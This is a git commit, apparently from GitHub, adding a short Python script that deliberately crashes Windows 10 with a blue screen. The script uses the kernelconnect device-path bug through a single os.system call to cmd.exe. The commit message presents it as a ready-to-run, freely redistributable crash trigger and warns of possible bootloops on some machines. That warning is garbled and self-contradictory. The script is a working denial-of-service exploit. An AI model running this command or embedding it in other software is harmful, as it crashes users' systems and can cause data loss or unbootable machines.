0b2c587a92d53bedeb624e16177c3a6430e7e6a6
Insertx2k <62176660+InsertX2k@users.noreply.github.com>
2021-02-05 22:42:31 +0200

    Added a Python Script which triggers a BSOD.
    This is a Python Script used to trigger the Bug that is intended to crash the whole operating system once it is started.
    WARNING : Running such script may cause bootloop in some OEM computers, so be aware to run this on OEM computers and portable computers.
    This may be freely distributed within anything without my permission, as long as the code is not being modified by anyway.

---
+++ bsodcauser-sourcecode.py
@@ -0,0 +1,7 @@
+import os
+print("Welcome to Windows BSOD Causer Project")
+print("This project or App may be freely distributed within anything for free and without my permission")
+print("The developer of this project is Insertx2k Dev, using the Windows 10 KernelConnect Bug")
+print("Please note that you SHOULD not run this BSOD trigger when you are not sure what it does to your computer.")
+print("Please wait, Causing a BSOD...")
+os.system('cmd.exe /c "cd \\.\globalroot\device\condrv\kernelconnect"')
